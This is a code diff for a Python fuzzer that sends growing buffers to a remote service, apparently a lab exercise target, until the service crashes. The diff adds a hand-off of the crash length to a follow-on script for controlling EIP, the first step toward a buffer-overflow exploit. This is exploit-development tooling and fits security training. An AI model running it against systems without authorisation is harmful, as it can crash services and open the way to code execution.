@@ -3,11 +3,14 @@
 import socket
 import argparse
 import itertools
+import time
+import subprocess
+import sys
 from typing import Optional
 
 def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 	# Define prefix and buffer
-	prefix = b"OVERFLOW1 "
+	prefix = b"OVERFLOW1 "														# CHANGE IF NECESSARY
 	buffer = b"A"
 	timeout = 5
 	try:
@@ -29,8 +32,8 @@ def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 						buffer
 					]
 				)
-				s.send(payload)
 				print(f"Fuzzing with {len(buffer)} bytes...")
+				s.send(payload)
 
 				response = s.recv(1024)
 				# Print the response from the server and sleep for 1 second
@@ -40,13 +43,28 @@ def main(ip: str, port: int, increment: Optional[int] = None) -> None:
 		
 	except:
 		print("\n","="*25,"CRASH","="*25,"\n")
-		print(f"Fuzzing process crashed at {len(buffer)} bytes")
+		overflow_threshold = len(buffer)
+		print(f"Fuzzing process crashed at {overflow_threshold} bytes")
+		while True:
+			answer = input("Do you want to continue? (y/n): ")
+			if answer.lower() == "y":
+				print("Starting the Control EIP Script with:")
+				print(f"\tIP: {ip}")
+				print(f"\tPort: {port}")
+				print(f"\tOverflow Threshold: {overflow_threshold}")
+				subprocess.run(['python', './002_control_eip.py', ip, port, overflow_threshold])
+				break
+			elif answer.lower() == "n":
+				print("Exiting...")
+				break
+			else:
+				print("Invalid input, please enter 'y' or 'n'.")
 		sys.exit(0)
 
 if __name__ == "__main__":
 	# Parse command line arguments
 	parser = argparse.ArgumentParser(
-		prog="Automatic Fuzzer",
+		prog="Crash Fuzzer",
 		description="""This is a Python script for fuzz testing a remote server by sending various buffer sizes to the target application. 
 	The script takes three arguments: an IP address, a port number, and an optional increment flag. It runs the target program multiple times, each time with a different buffer size, 
 	in an attempt to crash the target program. The IP address and port number must be provided when running the script, and the increment flag can be optionally specified to set the 
